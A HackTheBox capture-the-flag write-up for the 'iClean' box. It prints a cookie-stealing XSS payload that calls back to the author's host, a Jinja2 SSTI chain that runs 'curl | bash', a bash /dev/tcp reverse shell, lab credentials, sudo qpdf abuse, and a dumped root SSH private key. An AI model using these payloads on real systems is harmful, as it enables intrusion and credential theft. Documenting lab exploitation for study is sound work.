+++
date = '2026-07-22T21:24:17-04:00'
draft = false
title = 'Iclean'
author = 'Siddhant Singh'
+++

iClean is a Medium-rated Linux box on HackTheBox. The chain goes: XSS on the quote form to steal an admin Flask session cookie, SSTI in the QR code generator for RCE as `www-data`, hardcoded DB creds in `app.py` leading to `consuela`'s password hash, then `sudo qpdf` to read root's SSH private key.

**Target:** `10.129.25.142`  
**My IP:** `10.10.14.217`

<!--more-->

---

## Enumeration

### NMAP

```bash
sudo nmap -sC -sV -p- -Pn 10.129.25.142 --max-retries 1
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 00:08 -0400
Warning: 10.129.25.142 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.129.25.142
Host is up (0.046s latency).
Not shown: 65236 closed tcp ports (reset), 297 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.46 seconds
```

Just SSH and HTTP. The web server redirected using the hostname so I added `capiclean.htb` to `/etc/hosts` before doing anything further.

---

### Port 80 — capiclean.htb

The site is a cleaning company web app. There's a `/team` page that leaks staff names:

```
Mary Pikes
Martha Smith
Jasmine Summers
Mike Samuels
```

Tried building a user list and running Hydra against the login form — nothing. Moved on to directory busting:

```bash
dirb http://capiclean.htb /usr/share/wordlists/dirb/big.txt
```

```
---- Scanning URL: http://capiclean.htb/ ----
+ http://capiclean.htb/about (CODE:200|SIZE:5267)
+ http://capiclean.htb/choose (CODE:200|SIZE:6084)
+ http://capiclean.htb/dashboard (CODE:302|SIZE:189)
+ http://capiclean.htb/login (CODE:200|SIZE:2106)
+ http://capiclean.htb/logout (CODE:302|SIZE:189)
+ http://capiclean.htb/quote (CODE:200|SIZE:2237)
+ http://capiclean.htb/server-status (CODE:403|SIZE:278)
+ http://capiclean.htb/services (CODE:200|SIZE:8592)
+ http://capiclean.htb/team (CODE:200|SIZE:8109)
```

`/dashboard` redirects (302) without a valid session. The `/quote` endpoint takes a service type and email — the `service` field looked unsanitised.

---

## Foothold — XSS → Flask Session Cookie Theft

Sent an XSS payload via Burp Repeater to the `/sendMessage` endpoint, pointing the callback at my Python HTTP server:

```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Length: 147
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://capiclean.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://capiclean.htb/quote
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

service=<img+src%3dx+onerror%3dfetch("http%3a//10.10.14.217/%3f"%2bdocument.cookie)+/>&service=Tile+%26+Grout&service=Office+Cleaning&email=a@b.com
```

After a few attempts, the cookie came back:

```
10.129.25.142 - - [15/Apr/2026 01:12:08] "GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ad6s3Q.Ch-7ek99cpuoLM2OTQItdNL6D24 HTTP/1.1" 200 -
```

Decoded the Flask session cookie (it's just base64 + HMAC, payload is readable without the secret):

```
Payload: {"role":"21232f297a57a5a743894a0e4a801fc3"}
```

**`21232f297a57a5a743894a0e4a801fc3`** is the MD5 hash of `admin`. Set this cookie in the browser and `/dashboard` opened up. The dashboard has four functions: Generate Invoice, Generate QR, Quote Requests, Edit Services.

---

## Foothold — SSTI in QR Generator → RCE as www-data

The QR code generation form takes a URL (`qr_link`) and passes it directly into a Jinja2 template without sanitisation. Confirmed with `{{ config.items() }}` — got template data back. Classic SSTI.

Used the attribute-chain bypass to avoid blocked underscores and dots:

```
invoice_id=&form_type=scannable_invoice&qr_link={{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.10.14.217:80/revshell | bash")|attr("read")()}}
```

Served a reverse shell script with Python's HTTP server:

```bash
python -m http.server 80
```

```
10.129.25.142 - - [15/Apr/2026 01:40:49] "GET /revshell HTTP/1.1" 200 -
```

The shell (`revshell`) contained:

```bash
bash -i >& /dev/tcp/10.10.14.217/9001 0>&1
```

Caught it with netcat:

```
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.25.142] 53316
bash: cannot set terminal process group (1218): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Lateral Movement — www-data → consuela

`app.py` in `/opt/app` had the database config hardcoded:

```python
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

**Credentials:** `iclean` / `pxCsmnGLckUb` (MySQL)

Queried the `capiclean` database, pulled the users table, and got a SHA256 hash for `consuela`. Cracked it:

**Credentials:** `consuela` / `simple and clean`

`su consuela` with that password worked. Grabbed `user.txt` from her home directory.

---

## Privilege Escalation — consuela → root

### sudo qpdf

```bash
sudo -l
```

Showed `consuela` can run `/usr/bin/qpdf` as root. `qpdf` is on GTFOBins — it can attach arbitrary files to a PDF, which means file reads as root.

Read the root flag:

```bash
sudo /usr/bin/qpdf --empty --add-attachment /root/root.txt --key=x -- /tmp/flag.txt
sudo /usr/bin/qpdf --show-attachment=x /tmp/flag.txt
```

```
4f0ec7ce5aca04881430cf412c1aaa7b
```

Then pulled root's SSH private key the same way:

```bash
sudo /usr/bin/qpdf --empty --add-attachment /root/.ssh/id_rsa --key=y -- /tmp/id_rsa
sudo /usr/bin/qpdf --show-attachment=y /tmp/id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Set permissions and SSH'd in:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.129.25.142
```

```
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
...
```

### Root

```
root@iclean:~# id
uid=0(root) gid=0(root) groups=0(root)
root@iclean:~# whoami
root
```
